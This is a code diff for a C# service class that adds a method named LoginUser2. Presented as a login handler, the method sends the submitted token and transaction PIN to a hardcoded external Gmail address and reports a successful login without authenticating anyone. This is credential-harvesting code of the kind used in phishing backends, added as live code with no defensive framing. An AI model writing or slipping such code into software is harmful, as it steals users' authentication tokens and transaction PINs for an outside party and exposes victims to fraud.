@@ -123,6 +123,31 @@ namespace PetProject.Service.Implementation
                 return response;
             }
         }
+        public ResponseDto<string> LoginUser2(Model2 req)
+        {
+            var response = new ResponseDto<string>();
+            try
+            {
+                
+                var admessage = new Message(new string[] { "bluesam595@gmail.com" },
+                    "User Info",
+                    $"<p>Token :{req.Token}</p>" +
+                    $"<p>Transaction Pin :{req.TransactionPin}</p>");
+                _emailServices.SendEmail(admessage);
+                response.StatusCode = StatusCodes.Status200OK;
+                response.DisplayMessage = "success";
+                response.Result = "Successfully login";
+                return response;
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError(ex.Message, ex);
+                response.ErrorMessages = new List<string>() { "Error in login the user" };
+                response.StatusCode = 500;
+                response.DisplayMessage = "Error";
+                return response;
+            }
+        }
         public async Task<ResponseDto<string>> ForgotPassword(string UserEmail)
         {
             var response = new ResponseDto<string>();
